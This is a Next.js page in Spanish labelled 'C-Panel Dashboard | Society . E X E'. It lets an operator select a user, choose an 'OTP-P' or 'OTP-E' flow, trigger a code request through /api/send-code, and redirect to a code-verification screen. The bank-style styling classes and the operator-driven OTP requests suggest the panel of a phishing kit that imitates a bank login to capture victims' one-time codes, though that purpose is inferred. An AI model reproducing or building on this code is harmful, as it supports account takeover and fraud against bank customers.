"use client";

import { useEffect, useState } from "react";
import { useRouter } from "next/navigation";

const flows = [
  { id: "default", label: "OTP-P" },
  { id: "recupero", label: "OTP-E" },
];

export default function FlowSelectorPage({ searchParams }) {
  const user = searchParams?.user || "";
  const [selected, setSelected] = useState("default");
  const [message, setMessage] = useState("");
  const router = useRouter();

  useEffect(() => {
    const saved = localStorage.getItem("svpFlow") || "default";
    setSelected(saved);
  }, []);

  const selectFlow = (flow) => {
    localStorage.setItem("svpFlow", flow);
    setSelected(flow);
    setMessage(`Flujo "${flow}" seleccionado. Puedes continuar en el login.`);
  };

  const goHome = () => {
    router.push("/");
  };

  const requestForUser = async () => {
    if (!user) {
      setMessage("No hay usuario seleccionado, primero elige un usuario desde dashboard.");
      return;
    }

    setMessage("Enviando solicitud al usuario...");
    try {
      const resp = await fetch("/api/send-code", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ user, flow: selected }),
      });
      const data = await resp.json();
      if (!resp.ok) {
        setMessage(`Error: ${data.message || "No se pudo enviar solicitud"}`);
        return;
      }

      const nextMessage = data.code ? `Código de prueba: ${data.code}` : "El usuario ha recibido la solicitud.";
      setMessage(`${nextMessage} Redirigiendo a verificación...`);

      router.push(`/loading?next=code&user=${encodeURIComponent(user)}`);
    } catch (error) {
      setMessage("Error de red: no se pudo solicitar informacion.");
    }
  };

  return (
    <main className="bc-container bc-mt-4" style={{ maxWidth: "500px" }}>
      <h2>Seleccionar flujo de datos</h2>
      <p>C-Panel Dashboard | Society . E X E</p>

      <div style={{ display: "flex", gap: "0.8rem", marginBottom: "1rem" }}>
        {flows.map((flow) => (
          <button
            key={flow.id}
            className={`bc-button ${selected === flow.id ? "bc-button-primary" : "bc-button-outline"}`}
            onClick={() => selectFlow(flow.id)}
          >
            {flow.label}
          </button>
        ))}
      </div>

      <div style={{ marginBottom: "1rem" }}>
        <strong>Usuario seleccionado: </strong> {user || "(ninguno)"}
      </div>
      {message && <p>{message}</p>}
      <div style={{ display: "flex", gap: "0.75rem", flexWrap: "wrap" }}>
        <button className="bc-button bc-button-fill" onClick={requestForUser}>
          Solicitar info de usuario
        </button>
        <button className="bc-button bc-button-outline" onClick={goHome}>
          Volver al login principal
        </button>
      </div>
    </main>
  );
}
